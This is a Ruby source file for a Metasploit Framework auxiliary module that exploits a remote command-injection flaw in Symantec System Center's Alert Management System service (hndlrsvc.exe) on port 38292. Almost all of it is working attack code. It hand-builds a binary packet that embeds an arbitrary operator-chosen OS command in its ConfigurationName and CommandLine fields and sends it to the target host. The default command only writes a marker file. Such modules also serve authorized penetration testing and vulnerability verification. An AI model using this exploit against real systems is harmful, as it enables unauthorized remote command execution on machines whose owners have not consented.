##
# $Id: ams_hndlrsvc.rb 9179 2010-04-30 08:40:19Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Symantec System Center Alert Management System (hndlrsvc.exe) Arbitrary Command Execution',
			'Description'    => %q{
					Symantec System Center Alert Management System is prone to a remote command-injection vulnerability
					because the application fails to properly sanitize user-supplied input.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'OSVDB', '66807'],
					[ 'BID', '41959' ],
					[ 'URL', 'http://www.foofus.net/~spider/code/AMS2_072610.txt' ],
				],
			'DisclosureDate' => 'Jul 26 2010'))

			register_options(
				[
					Opt::RPORT(38292),
					OptString.new('CMD', [ false, 'The OS command to execute', 'cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\metasploit.txt']),
				], self.class)
	end

	def run
		begin
			connect

				cmd = datastore['CMD']
				
				if ( cmd.length > 128 )
					raise RuntimeError,"Command strings greater then 128 characters will not be processed!"
				end

				string_uno  = Rex::Text.rand_text_alpha_upper(11)
				string_dos  = Rex::Text.rand_text_alpha_upper(rand(4) + 5)

				packet =  "\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00"
				packet << "\x02\x00\x95\x94\xc0\xa8\x02\x64\x00\x00\x00\x00\x00\x00\x00\x00"
				packet << "\xe8\x03\x00\x00"
				packet << 'PRGXCNFG'
				packet << "\x10\x00\x00\x00"
				packet << "\x00\x00\x00\x00\x04"
				packet << 'ALHD\F'
				packet << "\x00\x00\x01\x00\x00"
				packet << "\x00\x01\x00\x0e\x00"
				packet << 'Risk Repaired'
				packet << "\x00\x25\x00"
				packet << 'Symantec Antivirus Corporate Edition'
				packet << "\x00\xf9\x1d\x13\x4a\x3f"
				packet << [string_uno.length + 1].pack('v') + string_uno 
				packet << "\x00\x08\x08\x0a"
				packet << "\x00" + 'Risk Name' 
				packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')
				packet << "\x00" + string_dos 
				packet << "\x00\x08\x0a\x00"
				packet << 'File Path'
				packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')
				packet << "\x00" + string_dos
				packet << "\x00\x08\x11\x00"
				packet << 'Requested Action'
				packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')
				packet << "\x00" + string_dos 
				packet << "\x00\x08\x0e\x00"
				packet << 'Actual Action'
				packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')
				packet << "\x00" + string_dos
				packet << "\x00\x08\x07\x00"
				packet << 'Logger'
				packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')
				packet << "\x00" + string_dos 
				packet << "\x00\x08\x05\x00"
				packet << 'User'
				packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')
				packet << "\x00" + string_dos
				packet << "\x00\x08\x09\x00"
				packet << 'Hostname'
				packet << "\x00\x0e\x00" + [string_uno.length + 1].pack('v') + string_uno
				packet << "\x00\x08\x13\x00"
				packet << 'Corrective Actions'
				packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')
				packet << "\x00" + string_dos
				packet << "\x00\x00\x07\x08\x12\x00"
				packet << 'ConfigurationName'
				packet << [cmd.length + 3].pack('n') + [cmd.length + 1].pack('n')
				packet << "\x00" + cmd
				packet << "\x00\x08\x0c\x00"
				packet << 'CommandLine'
				packet << [cmd.length + 3].pack('n') + [cmd.length + 1].pack('n')
				packet << "\x00" + cmd
				packet << "\x00\x08\x08\x00"
				packet << 'RunArgs'
				packet << "\x00\x04\x00\x02\x00"
				packet << "\x20\x00\x03\x05\x00"
				packet << 'Mode'
				packet << "\x00\x04\x00\x02\x00\x00\x00"
				packet << "\x0a\x0d\x00"
				packet << 'FormatString'
				packet << "\x00\x02\x00\x00\x00\x08\x12\x00"
				packet << 'ConfigurationName'
				packet << "\x00\x02\x00\x00\x00\x08\x0c\x00"
				packet << 'HandlerHost'
				packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')
				packet << "\x00" + string_dos
				packet << "\x00" * packet.length
				
				print_status("Sending command: #{datastore['CMD']}")
				sock.put(packet)
				
				disconnect
		rescue ::Exception
		print_error("Error: #{$!.class} #{$!}")
		end
	end
end
